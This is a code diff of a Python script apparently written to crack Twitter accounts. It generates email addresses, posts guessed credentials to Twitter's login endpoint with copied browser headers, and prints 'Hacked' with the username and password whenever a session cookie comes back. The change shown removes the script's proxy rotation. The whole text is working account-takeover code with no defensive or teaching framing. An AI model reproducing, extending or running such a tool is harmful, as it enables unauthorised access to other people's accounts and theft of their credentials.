@@ -24,7 +24,7 @@ def pro():
         return c[0]
 
 
-def CHECK(user,pess,prox):
+def CHECK(user,pess):
 
 	head={
 		#head-data by @6g7r
@@ -51,7 +51,7 @@ def CHECK(user,pess,prox):
 	try:
 		time.sleep(0.7)
 		
-		req=requests.post('https://twitter.com/sessions',headers=head,data=data,proxies=prox,timeout=3)
+		req=requests.post('https://twitter.com/sessions',headers=head,data=data,proxies=None,timeout=3)
 		if ("ct0") in req.cookies:
 			print(colorama.Fore.GREEN+'--------------------------------')
 			print(f'Hacked: [{user}:{pess}] ')
@@ -80,10 +80,7 @@ while True:
     xr = random.choice(rx)
     Email = q+'78'+xr+user
     
-    pxx = pro()
-    proxx={
-			'http': f'http://{pxx}',
-			'https': f'http://{pxx}'}
-	
-    CHECK(user=Email,pess=pas,prox=proxx)
+    
+    
+    CHECK(user=Email,pess=pas)
 
